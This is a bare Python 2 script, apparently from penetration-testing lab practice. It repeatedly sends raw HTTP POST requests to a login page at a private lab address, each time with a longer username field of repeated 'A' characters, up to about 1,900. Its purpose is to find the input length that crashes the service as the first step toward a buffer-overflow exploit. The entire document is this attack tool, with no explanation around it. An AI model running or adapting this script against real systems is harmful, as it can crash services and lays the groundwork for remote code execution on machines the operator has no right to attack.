import socket
import time
c=100
while (c<2000):
	payload="username="+'A'*c+"&password=Pass"
	buffer =""
	buffer += "POST /login HTTP/1.1\r\n"
	buffer += "Host: 192.168.162.130\r\n"
	buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
	buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
	buffer += "Accept-Language: en-US,en;q=0.5\r\n"
	buffer += "Referer: http://10.11.0.22/login\r\n"
	buffer += "Connection: close\r\n"
	buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
	buffer += "Content-Length: "+str(len(payload))+"\r\n"
	buffer += "\r\n"
	buffer +=payload

	print buffer

	s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.162.130",80))
	s.send(buffer)
	print s.recv(1024)
	s.close()
	c+=100
	time.sleep(5) 
	print c 